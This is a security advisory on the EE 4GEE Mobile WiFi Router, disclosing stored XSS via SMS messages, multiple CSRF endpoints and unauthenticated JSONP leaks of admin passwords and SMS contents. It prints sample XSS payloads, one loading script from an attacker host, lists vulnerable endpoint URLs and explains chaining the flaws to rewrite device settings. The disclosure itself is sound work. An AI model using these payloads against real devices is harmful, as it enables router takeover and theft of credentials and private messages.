

Stored Cross Site Scripting (XSS) - SMS Messages:
-------------------------------------------------
<b>Attack Type:</b> Remote
<br>
<b>Impact:</b> Code Execution
<br>
<b>Affected Components:</b><br>http://ee.mobilebroadband/default.html#sms/smsList.html?list=inbox<br>
http://ee.mobilebroadband/getSMSlist?rand=0.19598614685224347
<br>
<br>
<b>Attack Vectors:</b> An attacker can exploit the vulnerability by sending a remote SMS message to the device with an XSS payload such as "<script src=http://payload.js</script>" which is executed upon the user viewing the SMS message within the admin panel "SMS Inbox" functionality. Additionally, self-XSS can be achieved by creating an XSS payload from the device its self within a text message, which could be chained with other vulnerabilities such as CSRF.
<br>
<br>
<b>Vulnerability Description:</b>The 4GEE Mobile WiFi Router is vulnerable to Stored Cross Site Scripting (XSS) within the "sms_content" parameter returned to the application's SMS Inbox webpage by the "getSMSlist" POST request, due to a lack of input validation and/or encoding. This exploit can be triggered by remotely sending an SMS message containing any XSS payload such as '"><script src=http://attacker.tld/r.js></script>' which upon clicking on the text message within the web application is successfully executed. 
<br>
<br>
Additionally, due to the other vulnerabilities identified within this device, such vulnerability can be chained with Cross Site Request Forgery (CSRF) using the Stored XSS payload to send an JavaScript XHR POST request to the "uploadSettings" webpage containing binary configuration data, allowing for total modification of device settings by an attacker.

CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 7.1 - High).

<b>Author:</b> James Hemmings - security@jameshemmings.co.uk
<br>
<b>Reference(s)</b>:
<br>
[1] https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities

Cross Site Request Forgery (CSRF) - Multiple:
-------------------------------------------------
<b>Attack Type:</b> Remote
<br>
<b>Impact:</b> Code Execution
<br>
<b>Affected Components:</b>
<br>
http://192.168.1.1/goform/AddNewProfile?rand=0.376065695742409
<br>
http://192.168.1.1/goform/setWanDisconnect?rand=0.6988130822240772
<br>
http://192.168.1.1/goform/setSMSAutoRedirectSetting?rand=0.9003361879232169
<br>
http://192.168.1.1/goform/setReset?rand=0.021764703082234105
<br>
http://192.168.1.1/goform/uploadBackupSettings
<br>
<br>
<b>Attack Vectors:</b> ??????
<br>
<br>
<b>Vulnerability Description:</b> The 4GEE Mobile WiFi Router is vulnerable to multiple Cross Site Request Forgery (CSRF) vulnerabilities within various router administration webpages, due to the lack of robust request verification tokens within requests. An attacker could persuade an authenticated user to visit a malicous website using phishing and/or social engineering techniques to send an CSRF request to the web application, thus executing the privileged function as the authenticated user. In this case, due to the lack of authentication on certain privileged functions, authentication may not be neccessary.
<br>
<br>
The following webpages were identified to be vulnerable to Cross Site Request Forgery (CSRF) attacks:
<br>
<br>
AddNewProfile [2].
<br>
setWanDisconnect [3].
<br>
setSMSAutoRedirectSetting [4].
<br>
setReset [5].
<br>
uploadBackupSettings [6].
<br>
<br>
CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 6.8 - Medium).
<br>
<br>
<b>Author:</b> James Hemmings - security@jameshemmings.co.uk
<br>
<b>Reference(s):</b>
<br>
[1] https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities
<br>
[2] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/AddProfileCSRFXSSPoc.html
<br>
[3] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFInternetDCPoC.html
<br>
[4] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFPocRedirectSMS.html
<br>
[5] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFPocResetDefaults.html
<br>
[6] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/uploadBinarySettingsCSRFPoC.html
<br>

JSONP Sensitive Information Disclosure - Multiple
-------------------------------------------------
<b>Attack Type:</b> Remote
<br>
<b>Impact:</b> Information Disclosure, Escalation of Privileges
<br>
<b>Affected Components:</b> 
<br>
http://192.168.1.1/goform/getPasswordSaveInfo
<br>
http://192.168.1.1/goform/getSingleSMSReport?rand=0.133713371337
<br>
http://192.168.1.1/goform/getSingleSMS?sms_id=1&rand=0.133713371337
<br>
http://192.168.1.1/goform/getSMSStoreState
<br>
http://192.168.1.1/goform/getSMSAutoRedirectSetting
<br>
http://192.168.1.1/goform/getSysteminfo
<br>
http://192.168.1.1/goform/getUsbIP?rand=0.13371337
<br>
<b>Attack Vectors:</b> ??????
<br>
<b>Vulnerability Description:</b> The 4GEE Mobile WiFi Router is vulnerable to multiple JSONP information disclosure vulnerabilities within various endpoints which retrieve and/or set data. The JSONP endpoints allow for unauthenticated information disclosure of sensitive configuration data, settings, administration passwords and SMS messages, due to the lack of robust and effective access control. An attacker could view such unauthenticated endpoints via the local WiFi network to gain access to the administration credentials, router configuration and/or SMS messages.
<br>
<br>
CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 8.1 - High).
<br>
<b>Author:</b> James Hemmings - security@jameshemmings.co.uk
<br>
<b>Reference(s):</b>
<br>
[1] https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities
<br>
<br>

Disclaimer
-------------------------------------------------
The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
